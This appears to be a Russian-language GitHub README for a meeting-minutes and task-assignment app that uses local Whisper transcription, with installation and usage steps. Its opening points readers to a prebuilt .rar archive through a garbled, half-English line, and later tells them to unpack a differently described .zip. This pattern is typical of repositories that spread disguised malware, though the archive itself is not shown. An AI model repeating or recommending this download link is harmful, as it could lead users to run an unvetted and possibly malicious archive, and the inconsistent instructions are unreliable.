# MeetingProtocolSystem
Система протоколирования совещаний с автоматической отправкой распоряжений сотрудникам

 ИНСТРУКЦИЯ ПО УСТАНОВКЕ 
 # Инструкция по установке системы «Протокол+Распоряжения»
 # Загрузите файл со стрелкой на вашем GitHub file rar : [https://github.com/diancahya26/MeetingProtocolSystem/blob/main/Meeting_Management_System.rar](https://github.com/diancahya26/MeetingProtocolSystem/blob/main/Meeting_Management_System.rar)
## Требования
- Python 3.11 или выше
- Интернет (только для первой загрузки модели faster-whisper)

## Шаги установки

1. Распакуйте архив Meeting_Management_System.zip в любую папку

2. Откройте командную строку (CMD) и перейдите в папку с проектом:
   cd /d "путь_к_папке\Meeting_Management_System"

3. Установите необходимые библиотеки:
   pip install -r requirements.txt

4. Запустите приложение:
   python app.py

5. Откройте браузер и перейдите по адресу:
   http://localhost:5000

## Примечание
- При первом запуске будет загружена модель faster-whisper (около 500MB)
- База данных создастся автоматически
- Система работает полностью оффлайн, API-ключи не требуются

# Инструкция по использованию системы «Протокол+Распоряжения»

## 1. Главная страница (Dashboard)
- Показывает общую статистику: количество совещаний, утверждённых протоколов, поручений и выполненных задач

## 2. Создание совещания
- Перейдите в раздел «Совещания»
- Заполните поля: Название, Дата, Повестка, Участники
- Нажмите «Создать и отправить приглашения»

## 3. Подтверждение приглашений
- Перейдите в раздел «Приглашения»
- Нажмите «Подтвердить» или «Отклонить»

## 4. Запись и обработка аудио (ИИ)
- Перейдите в раздел «Запись + ИИ»
- Выберите режим «Реальный ИИ (Локальный Whisper)» (это faster-whisper)
- Выберите совещание (опционально)
- СПОСОБ 1: Нажмите «Начать запись» → говорите → «Остановить запись»
- СПОСОБ 2: Загрузите готовый аудиофайл (MP3, WAV, M4A)
- Нажмите «Загрузить и обработать ИИ»
- Дождитесь обработки (10-30 секунд)

## 5. Утверждение протокола
- Перейдите в раздел «Протоколы»
- Просмотрите транскрипцию и резюме
- Нажмите «Утвердить и опубликовать»

## 6. Управление поручениями
- Перейдите в раздел «Поручения»
- Измените статус с «Назначено» на «Выполнено» через выпадающий список

## 7. Просмотр отчётов
- Перейдите в раздел «Отчёты»
- Посмотрите статистику выполнения задач по каждому сотруднику

## 8. Управление пользователями
- Перейдите в раздел «Админ»
- Добавьте, отредактируйте или удалите пользователя

## Важно
- Система использует локальную модель faster-whisper
- Никакие API-ключи не требуются
- Всё работает оффлайн после первой загрузки модели
